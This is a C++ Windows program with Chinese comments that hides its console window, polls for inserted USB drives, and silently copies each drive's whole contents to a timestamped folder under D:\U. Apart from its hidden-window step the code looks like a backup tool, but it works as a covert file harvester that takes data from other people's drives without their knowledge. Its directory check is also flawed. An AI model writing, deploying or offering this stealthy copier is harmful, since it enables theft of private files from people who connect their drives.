// UDiskAutoCopy.cpp : 定义控制台应用程序的入口点。

#include "stdafx.h"
#include <windows.h>
#include <filesystem>
#include <iostream>
#include <iomanip>
#include <direct.h>
#include <string>
using namespace std;

#define  OK						0
#define  ERR						-1

#define DISK_MAX				26
#define DISK_NAME_LEN		4						//"D:\\"（转译成一个\）
#define BACK_DIR				"D:\\U"
#define DIR_MAX_LEN			260		

static bool GlobalFlag = false;
//#define DRIVE_REMOVABLE	2
//#define DRIVE_FIXED			3
//#define DRIVE_REMOTE		4
//#define DRIVE_CDROM			5

//递归思路：扫描该目录下所有文件。
//如果是文件，拷贝CopyFile()。如果是文件夹，继续递归，在目标文件夹里新建文件夹(folder)，拷贝到该文件夹中。
int CopyDir(char szSrcPath[], char szDstPath[]) {	
	WIN32_FIND_DATA stWinFileDate;//存储了文件（包含文件夹）信息
	HANDLE hd;//句柄

	char szFindDir[DIR_MAX_LEN] = { 0 };//要查找的目录
	char szNextSrc[DIR_MAX_LEN] = { 0 };//子目录
	char szNextDst[DIR_MAX_LEN] = { 0 };//子目录要拷到的目标文件夹

	//*表示找目录下所有文件
	_snprintf_c(szFindDir, DIR_MAX_LEN, "%s\\*", szSrcPath);
	//找文件，一参目录dir，二参文件描述信息
	//dir = D:\* 搜索该目录下所有文件
	hd = FindFirstFile(szFindDir, &stWinFileDate);//第一个文件信息存入AllData。返回的hd为句柄，用于找下一个文件
	if (hd == INVALID_HANDLE_VALUE){//hd查找失败
		return ERR;
	}
	//开始拷贝
	//filename：“.”表示当前目录，“..”表示上级目录
	//D:\A\..\aa 相当于D:\aa
	while (1) {
		if (strcmp(stWinFileDate.cFileName, ".") != 0 && strcmp(stWinFileDate.cFileName, "..") != 0) {
			printf("%s\n", stWinFileDate.cFileName);
			if (stWinFileDate.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {//判断是否为文件夹FILE_ATTRIBUTE_DIRECTORY
				//是文件夹
				memset(szNextDst, 0, DIR_MAX_LEN);//目录清0
				_snprintf_c(szNextDst, DIR_MAX_LEN, "%s\\%s", szDstPath, stWinFileDate.cFileName);//拷贝过来
				
				mkdir(szNextDst);//生成下一个文件

				memset(szNextSrc, 0, DIR_MAX_LEN);
				_snprintf_c(szNextSrc, DIR_MAX_LEN, "%s\\%s", szSrcPath, stWinFileDate.cFileName);
				//以该文件夹为根，开始递归
				CopyDir(szNextSrc, szNextDst);
			}
			else {//是文件
				memset(szNextDst, 0, DIR_MAX_LEN);
				_snprintf_c(szNextDst, DIR_MAX_LEN, "%s\\%s", szDstPath, stWinFileDate.cFileName);
				
				memset(szNextSrc, 0, DIR_MAX_LEN);
				_snprintf_c(szNextSrc, DIR_MAX_LEN, "%s\\%s", szSrcPath, stWinFileDate.cFileName);
				//拷贝该文件
				//printf("copyFile:[%s]->[%s]\n", szNextSrc, szNextDst);
				CopyFile(szNextSrc, szNextDst, false);
			}
		}
		if (!FindNextFile(hd, &stWinFileDate))//通过句柄找下一个文件，返回bool，true表示找到了
		{
			break;
		}
	}
	FindClose(hd);//关闭句柄
	return OK;
}

int getDisk() {
	DWORD drv = GetLogicalDrives();//获取电脑中的所有盘符。drv共32个bit位，26个字母占26位，存在即1
	char szDisk[DISK_NAME_LEN] = { 0 };//源文件
	int iDrvType;//文件类型
	char szDstPath[DIR_MAX_LEN] = { 0 };//目的地址

	if (drv == 0) {//如果返回0，表示出错：电脑里不可能没盘符
		return ERR;
	}
	cout << "所有盘符 = " << hex << drv << endl;//默认返回十进制。hex表示转换为十六进制
	for (int i = 0; i < DISK_MAX; i++) {
		//判断drv的第i个比特位是否为0
		if (drv&(1 << i)) {//不为0
			//找到盘符：“A”+i
			_snprintf_c(szDisk, DISK_NAME_LEN, "%c:\\", 'A' + i);//如果是，就打印对应盘符字母，放入szDisk
			iDrvType = GetDriveType(szDisk);//拿到盘符类型：判断是否为U盘   *字符集改为多字节字符
			printf("%c盘Type = %d\n", 'A' + i, iDrvType);

			if (iDrvType == DRIVE_REMOVABLE) {//判断是U盘类型（2）
				//是U盘。获取U盘状态（是否可以打开了？）
				if (GetVolumeInformation(szDisk, 0, 0, 0, 0, 0, 0, 0)) {//GetVolumeInformation()返回true时表示准备好了
					GlobalFlag = true;
					//没有拷贝目标文件夹就创建

					cout << "检测到U盘：" << szDisk << " 即将开始拷贝，目标文件夹：" << BACK_DIR << endl;
					string folderPath = "D:\\U";
					if (GetFileAttributesA(folderPath.c_str()) & FILE_ATTRIBUTE_DIRECTORY) {
						bool flag = CreateDirectory(folderPath.c_str(), NULL);
						if (flag) {
							cout << "D:\\U创建成功." << endl;
						}	
						else {
							cout << "D:\\U已存在." << endl;
						}
					}

					//递归拷贝
					_snprintf_c(szDstPath, DIR_MAX_LEN, "%s\\%d", BACK_DIR, time(0));
					//在BACK_DIR下新建一个以时间（time(0)）命名的文件夹
					mkdir(szDstPath);

					//执行整个目录拷贝！
					CopyDir(szDisk, szDstPath);//U盘盘符，目的文件夹
					cout << "拷贝完成！" << endl;
				}
			}
		}
	}
	cout << endl;
	return OK;
}

int main(){
	FreeConsole();
	while (1) {
		if (!GlobalFlag) {
			cout << "轮询检测中..." << endl;
			getDisk();
			Sleep(3000);
		}
		else {
			break;
		}
	}

	system("pause");
    return 0;
}

